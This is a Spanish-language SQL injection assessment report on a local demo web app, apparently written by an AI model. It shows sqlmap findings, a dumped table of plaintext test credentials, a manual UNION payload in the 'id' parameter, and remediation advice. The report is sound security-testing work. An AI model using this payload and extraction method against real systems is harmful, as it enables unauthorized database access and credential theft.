# Informe de Análisis de Vulnerabilidades SQL Injection
**Objetivo:** http://web.dev.local:8083  
**Fecha:** 2026-04-25T11:38:17Z  
**Modelo:** sonnet4.6  
**Tipo de análisis:** SQL Injection  

---

## 1. Resumen Ejecutivo

Se identificó y explotó con éxito una vulnerabilidad **SQL Injection clásica** en el parámetro `id` del endpoint principal de la aplicación web `http://web.dev.local:8083`. La vulnerabilidad permite a un atacante no autenticado extraer toda la información de la base de datos, incluyendo credenciales de usuario en texto plano.

---

## 2. Información del Entorno

| Campo | Valor |
|-------|-------|
| URL objetivo | http://web.dev.local:8083 |
| Sistema operativo servidor | Linux Debian |
| Tecnología web | PHP 8.1.33, Apache 2.4.65 |
| Base de datos | MySQL >= 5.0 (MariaDB fork) |
| Usuario DB | root@172.18.0.3 |

---

## 3. Vulnerabilidad Encontrada

### SQL Injection en parámetro `id` (GET)

**Tipo:** SQL Injection clásica (error-based, boolean-blind, time-based blind, UNION-based)  
**Severidad:** CRÍTICA  
**Parámetro vulnerable:** `id` (método GET)  
**URL:** `http://web.dev.local:8083/?id=<PAYLOAD>&Submit=Submit`

#### 3.1 Evidencia de vulnerabilidad

Al enviar una comilla simple (`'`) como valor del parámetro `id`, la aplicación devuelve un error SQL sin sanitizar:

```
Fatal error: Uncaught mysqli_sql_exception: You have an error in your SQL syntax;
check the manual that corresponds to your MariaDB server version for the right syntax
to use near ''1''' at line 1 in /var/www/html/low.php:11
```

Esto confirma que la entrada del usuario se inserta directamente en la consulta SQL sin ningún tipo de validación ni uso de consultas preparadas.

#### 3.2 Tipos de inyección confirmados

| Tipo | Título |
|------|--------|
| Boolean-based blind | AND boolean-based blind - WHERE or HAVING clause (subquery - comment) |
| Error-based | MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR) |
| Time-based blind | MySQL >= 5.0.12 AND time-based blind (query SLEEP) |
| UNION query | Generic UNION query (NULL) - 2 columns |

---

## 4. Explotación

### 4.1 Enumeración de bases de datos

Mediante sqlmap se enumeraron las bases de datos disponibles:

```
available databases [5]:
  [*] information_schema
  [*] mysql
  [*] performance_schema
  [*] sqli_demo
  [*] sys
```

### 4.2 Enumeración de tablas (base de datos: sqli_demo)

```
Database: sqli_demo
[1 table]
+-------+
| users |
+-------+
```

### 4.3 Extracción de datos — Tabla `users`

```
Database: sqli_demo
Table: users
[8 entries]
+---------+---------------------+-------------+-----------+-----------+------------+
| user_id | email               | password    | username  | last_name | first_name |
+---------+---------------------+-------------+-----------+-----------+------------+
| 1       | admin@example.com   | password123 | admin     | Doe       | John       |
| 2       | jane@example.com    | secret456   | jsmith    | Smith     | Jane       |
| 3       | bob@example.com     | mypass789   | bjohnson  | Johnson   | Bob        |
| 4       | alice@example.com   | qwerty123   | awilliams | Williams  | Alice      |
| 5       | charlie@example.com | password    | cbrown    | Brown     | Charlie    |
| 6       | diana@example.com   | secure123   | ddavis    | Davis     | Diana      |
| 7       | eve@example.com     | hackme      | emiller   | Miller    | Eve        |
| 8       | frank@example.com   | admin123    | fwilson   | Wilson    | Frank      |
+---------+---------------------+-------------+-----------+-----------+------------+
```

### 4.4 Inyección UNION manual

También se verificó manualmente la inyección con un payload UNION para obtener el usuario y base de datos activos:

**Payload:**
```
GET /?id=1' UNION SELECT user(),database()-- -&Submit=Submit
```

**Resultado:**
```
First name: root@172.18.0.3
Surname: sqli_demo
```

Esto confirma que la aplicación se ejecuta con el usuario `root` de MySQL, maximizando el impacto potencial.

---

## 5. Causa Raíz

El código fuente referenciado en el error (`/var/www/html/low.php`, línea 11) construye la consulta SQL concatenando directamente el valor del parámetro `id` sin sanitización:

```php
// Código vulnerable (estimado):
$query = "SELECT first_name, last_name FROM users WHERE user_id = '$id'";
```

No se utiliza ninguna de las siguientes contramedidas:
- Consultas preparadas (prepared statements)
- Parámetros vinculados (bound parameters)
- Validación/sanitización de entrada
- Principio de mínimo privilegio en la base de datos

---

## 6. Impacto

| Dimensión | Descripción |
|-----------|-------------|
| **Confidencialidad** | ALTA — Extracción completa de todos los datos de la BD, incluyendo credenciales |
| **Integridad** | ALTA — Posible modificación/eliminación de datos |
| **Disponibilidad** | MEDIA — Posible denegación de servicio mediante consultas costosas |
| **Alcance** | Toda la base de datos `sqli_demo` y potencialmente otras DBs (usuario root) |

---

## 7. Recomendaciones

1. **Usar consultas preparadas (PDO o MySQLi):**
   ```php
   $stmt = $pdo->prepare("SELECT first_name, last_name FROM users WHERE user_id = ?");
   $stmt->execute([$id]);
   ```

2. **Validar y filtrar entradas:** Verificar que el parámetro `id` sea estrictamente numérico antes de usarlo.

3. **Principio de mínimo privilegio:** La aplicación no debe conectarse a la BD como `root`. Usar un usuario con permisos limitados (solo SELECT en las tablas necesarias).

4. **No exponer errores SQL al cliente:** Configurar PHP para no mostrar errores en producción (`display_errors = Off`).

5. **Almacenar contraseñas con hash:** Las contraseñas encontradas están en texto plano. Usar `password_hash()` con bcrypt.

6. **WAF (Web Application Firewall):** Implementar como capa adicional de defensa.

---

## 8. Herramientas Utilizadas

- `curl` — Exploración manual y verificación de inyección
- `sqlmap 1.9.10` — Detección automatizada y extracción de datos

---

## 9. Conclusión

La aplicación web en `http://web.dev.local:8083` presenta una vulnerabilidad **SQL Injection crítica** en el parámetro `id`. La explotación fue exitosa y permitió extraer la base de datos completa `sqli_demo` con 8 registros de usuarios, incluyendo nombres de usuario, emails y contraseñas en texto plano. La aplicación se conecta a la BD como usuario `root`, lo que amplía el impacto potencial a toda la infraestructura de base de datos. Se requiere corrección inmediata.
